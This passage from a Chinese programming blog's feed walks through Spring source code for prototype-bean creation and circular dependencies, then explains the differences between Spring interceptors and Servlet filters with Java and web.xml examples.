requiredType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">  <span class="comment">//一般do开头的方法都是干实事儿的，重点关注</span></span><br><span class="line">   <span class="keyword">return</span> doGetBean(name, requiredType, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Eagerly check singleton cache for manually registered singletons.  </span></span><br><span class="line"><span class="comment">// 可以看到不管是不是单例模式都会来一级缓存寻找，但是这里没有找到</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">sharedInstance</span> <span class="operator">=</span> getSingleton(beanName);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!typeCheckOnly) &#123;</span><br><span class="line">  <span class="comment">//标记对象是否之前创建过了</span></span><br><span class="line">   markBeanAsCreated(beanName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里只有第一次创建时会进来，标记为该类型对象已经创建，第二次获取bean实例时就知道之前已经创建了，直接退出</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">markBeanAsCreated</span><span class="params">(String beanName)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="built_in">this</span>.alreadyCreated.contains(beanName)) &#123;</span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>.mergedBeanDefinitions) &#123;</span><br><span class="line">         <span class="keyword">if</span> (!<span class="built_in">this</span>.alreadyCreated.contains(beanName)) &#123;</span><br><span class="line">            <span class="comment">// Let the bean definition get re-merged now that we&#x27;re actually creating</span></span><br><span class="line">            <span class="comment">// the bean... just in case some of its metadata changed in the meantime.</span></span><br><span class="line">            clearMergedBeanDefinition(beanName);</span><br><span class="line">           <span class="comment">//这里记录之前创建过的对象</span></span><br><span class="line">            <span class="built_in">this</span>.alreadyCreated.add(beanName);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断是否为isPrototypel类型对象</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mbd.isPrototype()) &#123;</span><br><span class="line">   <span class="comment">// It&#x27;s a prototype -&gt; create a new instance.</span></span><br><span class="line">   <span class="type">Object</span> <span class="variable">prototypeInstance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      beforePrototypeCreation(beanName);</span><br><span class="line">     <span class="comment">//这里就要创建prototypeInstance实例了</span></span><br><span class="line">      prototypeInstance = createBean(beanName, mbd, args);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">finally</span> &#123;</span><br><span class="line">      afterPrototypeCreation(beanName);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//重点</span></span><br><span class="line">   bean = getObjectForBeanInstance(prototypeInstance, name, beanName, mbd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">createBean</span><span class="params">(String beanName, RootBeanDefinition mbd, <span class="meta">@Nullable</span> Object[] args)</span></span><br><span class="line">      <span class="keyword">throws</span> BeanCreationException &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">      logger.trace(<span class="string">&quot;Creating instance of bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="type">RootBeanDefinition</span> <span class="variable">mbdToUse</span> <span class="operator">=</span> mbd;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Make sure bean class is actually resolved at this point, and</span></span><br><span class="line">  <span class="comment">//在动态解析类的情况下克隆bean定义</span></span><br><span class="line">   <span class="comment">// clone the bean definition in case of a dynamically resolved Class</span></span><br><span class="line">   <span class="comment">// which cannot be stored in the shared merged bean definition.</span></span><br><span class="line">   Class&lt;?&gt; resolvedClass = resolveBeanClass(mbd, beanName);</span><br><span class="line">   <span class="keyword">if</span> (resolvedClass != <span class="literal">null</span> &amp;&amp; !mbd.hasBeanClass() &amp;&amp; mbd.getBeanClassName() != <span class="literal">null</span>) &#123;</span><br><span class="line">      mbdToUse = <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(mbd);</span><br><span class="line">      mbdToUse.setBeanClass(resolvedClass);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Prepare method overrides.</span></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      mbdToUse.prepareMethodOverrides();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (BeanDefinitionValidationException ex) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(mbdToUse.getResourceDescription(),</span><br><span class="line">            beanName, <span class="string">&quot;Validation of method overrides failed&quot;</span>, ex);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// Give BeanPostProcessors a chance to return a proxy instead of the target bean instance.</span></span><br><span class="line">      <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> resolveBeforeInstantiation(beanName, mbdToUse);</span><br><span class="line">      <span class="keyword">if</span> (bean != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> bean;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbdToUse.getResourceDescription(), beanName,</span><br><span class="line">            <span class="string">&quot;BeanPostProcessor before instantiation of bean failed&quot;</span>, ex);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//这里do开头，是重点</span></span><br><span class="line">      <span class="type">Object</span> <span class="variable">beanInstance</span> <span class="operator">=</span> doCreateBean(beanName, mbdToUse, args);</span><br><span class="line">      <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">         logger.trace(<span class="string">&quot;Finished creating instance of bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> beanInstance;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// No special handling: simply use no-arg constructor.</span></span><br><span class="line"><span class="comment">//要通过无参构造器创建了</span></span><br><span class="line"><span class="keyword">return</span> instantiateBean(beanName, mbd);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取实例化策略，然后实例化对象</span></span><br><span class="line">beanInstance = getInstantiationStrategy().instantiate(mbd, beanName, parent);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the instantiation strategy to use for creating bean instances.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> InstantiationStrategy <span class="title function_">getInstantiationStrategy</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">this</span>.instantiationStrategy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//马上要创建了</span></span><br><span class="line"><span class="keyword">return</span> BeanUtils.instantiateClass(constructorToUse);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用反射要真正创建实例了</span></span><br><span class="line"><span class="keyword">return</span> ctor.newInstance(argsWithDefaultValues);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> B b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> B <span class="title function_">getB</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setB</span><span class="params">(B b)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.b = b;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//进入A的无参构造器，实例化对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---A created success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initialize the bean instance.</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">exposedObject</span> <span class="operator">=</span> bean;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//填充属性</span></span><br><span class="line">populateBean(beanName, mbd, instanceWrapper);</span><br><span class="line">exposedObject = initializeBean(beanName, exposedObject, mbd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上断点代码就是Spring中的源码显示，大家感兴趣，也可以自己打一遍。</p><p><strong>小总结</strong>：</p><ol><li>我们可以看到为什么当变量设置为prototype时，每次返回的对象都不一样.<ul><li>因为在Spring容器中根本没有缓存之前的对象，而是每次都反射一个新的对象进行返回。</li><li>而在单例模式时，会将对象放到缓存中，这样你下次再要对象时，直接从一级缓存中找。</li></ul></li><li>prototype也叫做原型，很多人以为是利用了原型设计模式，存第一次创建的实例，然后每次拷贝一个新的返回。<ul><li>但根据源码阅读发现创建的实例根本没有存储在容器中，哪来的拷贝。<code>不看源码你就被坑了，但是也不要相信我的话，你最好自己再看一遍。</code></li><li>推荐一个博主写的文章：<a href="https://blog.csdn.net/FanYien/article/details/117898188%E3%80%82">https://blog.csdn.net/FanYien/article/details/117898188。</a></li></ul></li><li>那prototype能解决循环依赖问题吗？<ul><li>不能，因为假如说A类中有一个B属性需要注入，当实例化A时需要注入B，而B现在没有，需要先实例一个B对象，实例B的时候一个A注入，但容器中找不到之前创建的A，所以需要自己再实例一个A对象，循环往复，因为每次返回的对象都不同。Spring官网也明确禁止了。</li><li>所以我们说Spring解决循环依赖的前提是对象是单例模式下的，并通过Set方法构建。</li></ul></li><li>那单例模式下是如何解决循环依赖的？<ul><li>这里推荐另一个博主写的，写的非常详细：<a href="https://blog.csdn.net/oneby1314/article/details/113789384">https://blog.csdn.net/oneby1314/article/details/113789384</a></li><li>其实总结下来就是，利用三层缓存来解决，现在容器需要注入一个A对象时，先去一级缓存中找，没有的话则容器直接实例化一个A（没有对属性赋值）并放入三级缓存，当需要注入A对象的B属性类时，也去容器找，没有的话再实例化一个B，当给B对象的A赋值时，也去一级缓存找，没有则去二级缓存找，再没有去三级缓存，这是发现找到了之前的A，则直接注入，B这就算完整了放在一级缓存，又回到A的初始化，去一级缓存找，发现有一个B，则对A也初始化。这样循环依赖就解决掉了。具体可以看上面博主的文章。</li></ul></li><li>看完后突然感觉似乎一层缓存也可以解决循环依赖问题，为什么Spring要用三层？<ul><li>这里我是看了<a href="https://juejin.cn/post/6930904292958142478%E8%BF%99%E4%BD%8D%E5%8D%9A%E4%B8%BB%E7%9A%84%E6%96%87%E7%AB%A0%E6%89%8D%E7%90%86%E8%A7%A3%E4%B8%80%E4%BA%9B">https://juejin.cn/post/6930904292958142478这位博主的文章才理解一些</a></li><li>大致是说三级缓存是Spring在结合<code>AOP</code>跟Bean的生命周期的设计，保证如果需要代理时，保证在Bean生命周期最后一步再完成代理。</li><li><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heirn3enj31xs0ekad1.jpg" alt="image-20220902091424411"></li></ul></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    这算是我第一次自己读Spring源码，在之前一般遇到问题我都是看有没有别人的总结，觉的源码我肯定看不了，看别人的总结又方便又快捷。今天是因为当我再来回顾这些知识的时候，脑子里出现很多问题，感觉作者并没有说清楚，而且众说纷纭，那我们就自己做实验，自己去寻找答案吧，虽然开始做是耗时耗力，但能让你的心慢慢沉下来，浮躁是读不了源码的，感谢之前一位朋友的建议，<code>生活上我们很多事情不需要太较真，但学习必须较真!!!</code>,文笔有限，如果觉得哪里写的有问题，也欢迎提醒我进行修改。最后建议大家，全信书不如无书，自己去打断点看源码得到的才是最真实的。</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 循环依赖 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拦截器与过滤器的区别</title>
      <link href="/2022/11/25/Web/%E6%8B%A6%E6%88%AA%E5%99%A8%E4%B8%8E%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/11/25/Web/%E6%8B%A6%E6%88%AA%E5%99%A8%E4%B8%8E%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="拦截器与过滤器的区别"><a href="#拦截器与过滤器的区别" class="headerlink" title="拦截器与过滤器的区别"></a>拦截器与过滤器的区别</h1><blockquote><p> 底层思想是什么？</p></blockquote><p>拦截器与过滤器都是基于AOP面向切面编程的思想来实现的。</p><blockquote><p>两者有什么相同，有什么不同？</p></blockquote><p>相同点：都可以对请求做出统一的处理，例如在方法调用前进行一些操作，在方法调后后处理一些操作</p><p>不同点：</p><ol><li>拦截器是Spring提供的（<code>org.springframework.web.servlet.HandlerInterceptor</code>），而过滤器是Servlet提供的（<code>java.servlet.*</code>）</li><li>触发时机不同，过滤器在请求到达Servlet前被拦截开始执行，拦截器在到达Controller前被拦截开始执行</li><li>实现不同，过滤器<strong>基于方法回调实现</strong>，而拦截器是<strong>基于动态代理（底层反射）实现</strong></li><li>支持的项目不同，过滤器只能在Web项目中用，拦截器可以在Swing，Application中都能用</li><li>使用场景不同，因为拦截器更接近业务系统，所以<strong>拦截器主要用来实现项目中的业务判断的</strong>，比如：登录判断、权限判断、日志记录等业务。而<strong>过滤器通常是用来实现通用功能过滤的</strong>，比如：敏感词过滤、字符集编码设置、响应数据压缩等功能。</li></ol><blockquote><p> 为什么使用他们？</p></blockquote><p>​    在我们的日常业务中，我们总有一些通用但又不涉及核心业务的需求，比如日志管理，权限管理，敏感信息排查等，如何将这部分内容抽取出来，而不侵入核心代码，并可以做到灵活的扩展。就可以使用拦截器或者过滤器，但他们应用场景是不同的。</p><h3 id="FIlter"><a href="#FIlter" class="headerlink" title="FIlter"></a>FIlter</h3><blockquote><p>如何进行使用？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器：执行 init 方法。&quot;</span>);</span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器：开始执行 doFilter 方法。&quot;</span>);</span><br><span class="line">        <span class="comment">// 请求放行</span></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器：结束执行 doFilter 方法。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器：执行 destroy 方法。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>生命周期是怎么样的？</p></blockquote><p>Filter有三个需要实现的方法：<code>init,doFilter,destroy</code></p><p>​    当Web服务启动时，就会调用 init 方法，</p><p>​    当请求进入时，在进入Controller之前就会被 doFilter 拦截到，然后判断是否后面还有拦截器，如果没有了，则执行业务方法，执行完业务方法，返回后，会回到 doFilter方法，再进行其他操作。<strong>这里需要注意</strong>：当最后一个Filter的 <code>filterChain.doFilter(servletRequest, servletResponse);</code> 被调用完后，数据已经被渲染到页面了，然后才操作的下面的处理。</p><p>​    Web服务结束时，<code>destroy()</code> 被调用。</p><blockquote><p>如何控制Filter的拦截顺序，以及doFilter() 方法先后是如何执行的？</p></blockquote><p>方法1：在web.xml中控制filter-mapping的位置来控制的，放在上面的会比放在下面的先执行，如下“用户登录检查过滤器”会比“接口日志过滤器”先执行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户登录检测过滤器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>UserLoginFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>net.tfgzs.demo.filter.UserLoginFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>UserLoginFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--接口日志过滤器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ApiLog<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>net.tfgzs.demo.filter.ApiLog<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ApiLog<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方法2：在@WebFilter中并未找到排序的方法，可以通过Filter的文件名来控制，比如：</p><ol><li>在同一个包下，aFilter &gt; bFilter</li><li>在不同包下，a/a.Filter &gt; a/b.Filter &gt; b/a.Filter</li></ol><p>当请求经过多个Filter时，在操作<code>filterChain.doFilter(servletRequest, servletResponse);</code>前后调用的顺序</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8gabpk3zvj30r40as75e.jpg" alt="image-20221124161334593"></p><p>​    <strong>这里需注意</strong>：在最后一个Filter的doFilter的filterChain.doFilter(servletRequest, servletResponse);调用完后数据就返回页面了，然后才开始操作后面的操作。</p><h3 id="Interceptor"><a href="#Interceptor" class="headerlink" title="Interceptor"></a>Interceptor</h3><blockquote><p>如何使用？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[ Interceptor ]：执行 preHandle 方法。&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[ Interceptor ]：执行 postHandle 方法。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[ Interceptor ]：执行 afterCompletion 方法。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Interceptor interceptor;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Interceptor1 interceptor1;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Interceptor2 interceptor2;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(interceptor)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        registry.addInterceptor(interceptor1)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        registry.addInterceptor(interceptor2)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>生命周期</p></blockquote><p>​    和Filter 是类似的，先顺序执行preHandle，再逆序执行postHandle，所有执行完后，逆序执行afterCompletion方法。</p><p>​    这里注意：最后一个preHandle处理完后，开始执行业务，在执行postHandler前， 页面就已经被渲染了。也就是Controller返回数据后执行：<code>this.returnValueHandlers.handleReturnValue(returnValue, this.getReturnValueType(returnValue), mavContainer, webRequest);</code>。</p><blockquote><p>如何控制拦截器的执行顺序</p></blockquote><p>​    在WebMvcConfigurer配置类中，按照注册的顺序执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>当同时使用拦截器与过滤器时，请求模型：</li></ol><p><img 